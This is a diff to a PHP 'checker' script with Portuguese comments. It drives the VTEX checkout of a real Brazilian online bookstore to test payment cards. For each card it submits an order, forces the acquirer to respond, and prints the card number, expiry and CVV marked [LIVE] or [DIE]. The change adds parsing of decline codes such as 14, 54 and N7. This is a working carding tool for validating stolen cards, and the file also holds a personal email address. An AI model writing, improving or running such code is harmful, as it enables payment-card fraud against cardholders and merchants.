@@ -1,6 +1,6 @@
 <?php
 // =====================================================
-// ✅ CHECKER VTEX - FLUXO CORRIGIDO DE TRANSAÇÃO
+// ✅ CHECKER VTEX - CAPTURA DE CÓDIGOS DE RETORNO (14, 54, N7, ETC)
 // =====================================================
 define('BASE_URL', 'https://loja.umlivro.com.br');
 define('EMAIL', 'danielvitordeoliveiraconceicao@gmail.com');
@@ -100,7 +100,7 @@ vtex_request(BASE_URL . "/api/checkout/pub/orderForm/" . $order_form_id . "/atta
     'postalCode' => SHIPPING_POSTAL_CODE, 'country' => SHIPPING_COUNTRY, 'street' => SHIPPING_STREET, 'number' => SHIPPING_NUMBER, 'neighborhood' => SHIPPING_NEIGHBORHOOD, 'city' => SHIPPING_CITY, 'state' => SHIPPING_STATE, 'receiverName' => SHIPPING_RECEIVER_NAME
 ], ['Content-Type: application/json', 'Accept: application/json'], $cookie_path);
 
-// 5. Envia dados de pagamento com estrutura forçada para o conector
+// 5. Envia dados de pagamento
 $payload_payment = [
     'payments' => [[
         'paymentSystem' => '1',
@@ -122,34 +122,37 @@ $payload_payment = [
 
 vtex_request(BASE_URL . "/api/checkout/pub/orderForm/" . $order_form_id . "/attachments/paymentData", $payload_payment, ['Content-Type: application/json', 'Accept: application/json'], $cookie_path);
 
-// 6. Executa a chamada de fechamento/placeOrder para forçar o gateway a processar a transação e retornar o erro real
+// 6. Executa o fechamento para forçar a resposta do adquirente
 $resp_place = vtex_request(BASE_URL . "/api/checkout/pub/orderForm/" . $order_form_id . "/complete", null, ['Content-Type: application/json', 'Accept: application/json'], $cookie_path);
 @unlink($cookie_path);
 
 $json_final = json_decode($resp_place, true);
 $aprovado = false;
+$codigo_retorno = "";
 $msg_detalhada = "";
 
-// Varredura nas mensagens de erro de fechamento de pedido da VTEX
-if (isset($json_final['messages']) && is_array($json_final['messages'])) {
-    foreach ($json_final['messages'] as $msg) {
-        if (!empty($msg['text'])) {
-            $msg_detalhada = $msg['text'];
-            break;
-        }
-    }
-}
-
-// Varredura de transações caso venham preenchidas no retorno do complete
-if (empty($msg_detalhada) && isset($json_final['paymentData']['transactions']) && is_array($json_final['paymentData']['transactions'])) {
+// Varredura avançada para extrair códigos específicos (14, 54, N7, etc.) das respostas do conector
+if (isset($json_final['paymentData']['transactions']) && is_array($json_final['paymentData']['transactions'])) {
     foreach ($json_final['paymentData']['transactions'] as $tx) {
         if (isset($tx['payments']) && is_array($tx['payments'])) {
             foreach ($tx['payments'] as $pay) {
                 if (($pay['status'] ?? '') === 'approved') {
                     $aprovado = true;
                 }
-                if (!empty($pay['connectorResponses']['message'])) {
-                    $msg_detalhada = $pay['connectorResponses']['message'];
+                
+                // Tenta capturar códigos e mensagens de retornos internos/connectorResponses
+                $connector = $pay['connectorResponses'] ?? [];
+                
+                if (!empty($connector['returnCode'])) {
+                    $codigo_retorno = $connector['returnCode'];
+                } elseif (!empty($connector['acquirerCode'])) {
+                    $codigo_retorno = $connector['acquirerCode'];
+                } elseif (!empty($connector['reasonCode'])) {
+                    $codigo_retorno = $connector['reasonCode'];
+                }
+
+                if (!empty($connector['message'])) {
+                    $msg_detalhada = $connector['message'];
                 } elseif (!empty($pay['lastMessage'])) {
                     $msg_detalhada = $pay['lastMessage'];
                 }
@@ -158,13 +161,26 @@ if (empty($msg_detalhada) && isset($json_final['paymentData']['transactions']) &
     }
 }
 
-if (empty($msg_detalhada)) {
-    $msg_detalhada = "Transação recusada / Sem saldo ou dados inválidos";
+// Se não achou na transação, procura nas mensagens gerais da VTEX
+if (empty($msg_detalhada) && isset($json_final['messages']) && is_array($json_final['messages'])) {
+    foreach ($json_final['messages'] as $msg) {
+        if (!empty($msg['text'])) {
+            $msg_detalhada = $msg['text'];
+            break;
+        }
+    }
 }
 
+// Monta a string final de resposta incluindo o código se ele existir
+$retorno_final = "";
+if (!empty($codigo_retorno)) {
+    $retorno_final .= "Código: {$codigo_retorno} - ";
+}
+$retorno_final .= !empty($msg_detalhada) ? $msg_detalhada : "Transação recusada / Sem saldo ou dados inválidos";
+
 if ($aprovado) {
-    echo "<span class='text-emerald-400 font-bold'>[LIVE]</span> <span class='text-slate-200'>Cartão: {$cc_num} | Validade: {$cc_mes}/{$cc_ano} | CVV: {$cc_cvv} | Retorno: Transação Aprovada com Sucesso</span>";
+    echo "<span class='text-emerald-400 font-bold'>[LIVE]</span> <span class='text-slate-200'>Cartão: {$cc_num} | Validade: {$cc_mes}/{$cc_ano} | CVV: {$cc_cvv} | Retorno: Aprovado com Sucesso</span>";
 } else {
-    echo "<span class='text-red-400 font-bold'>[DIE]</span> <span class='text-slate-400'>Cartão: {$cc_num} | Validade: {$cc_mes}/{$cc_ano} | CVV: {$cc_cvv} | Retorno: {$msg_detalhada}</span>";
+    echo "<span class='text-red-400 font-bold'>[DIE]</span> <span class='text-slate-400'>Cartão: {$cc_num} | Validade: {$cc_mes}/{$cc_ano} | CVV: {$cc_cvv} | Retorno: {$retorno_final}</span>";
 }
 ?>
